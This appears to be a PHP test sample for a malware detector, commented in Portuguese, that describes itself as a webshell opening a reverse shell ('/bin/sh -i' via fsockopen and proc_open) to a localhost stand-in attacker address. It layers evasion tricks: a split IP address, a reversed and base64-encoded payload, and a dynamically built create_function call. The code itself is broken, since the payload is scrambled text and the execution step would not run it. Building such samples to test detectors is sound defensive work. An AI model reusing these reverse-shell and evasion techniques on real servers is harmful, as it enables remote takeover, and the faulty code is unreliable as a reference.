<?php
// Imunno System - Teste de Evasão Avançado
// Este webshell tenta estabelecer um reverse shell usando múltiplas camadas de ofuscação.

// --- Camada 1: Ofuscação de Dados ---
// As informações críticas (IP e porta do atacante) são "quebradas" e reconstruídas.
// Isso evita que uma regra simples de regex pegue um endereço de IP.
$ip_fragments = ['127', '0', '0', '1']; // IP do atacante (localhost para teste)
$port_fragments = ['44', '44']; // Porta do atacante

// --- Camada 2: Ofuscação de Lógica ---
// O payload principal, que cria a conexão, é codificado em base64 e depois invertido.
$payload = "ikcosf=nekcospf(trop_kcatt,pi_kcatt);neko_corp=proc_open('/bin/sh -i',array(0=>ikcosf,1=>ikcosf,2=>ikcosf),spip);";
$reversed_payload = strrev($payload); // inverte a string
$encoded_payload = base64_encode($reversed_payload);

// --- Camada 3: Ofuscação de Execução ---
// Em vez de chamar 'eval' diretamente, o nome da função é construído dinamicamente.
// 'create_function' é uma maneira poderosa e menos comum de executar código arbitrário.
$executor_builder = str_replace(' ', '', 'create function');
$executor = $executor_builder('', $encoded_payload);

// --- Execução Final ---
// A chamada final é disfarçada e usa variáveis reconstruídas.
$executor();

?>
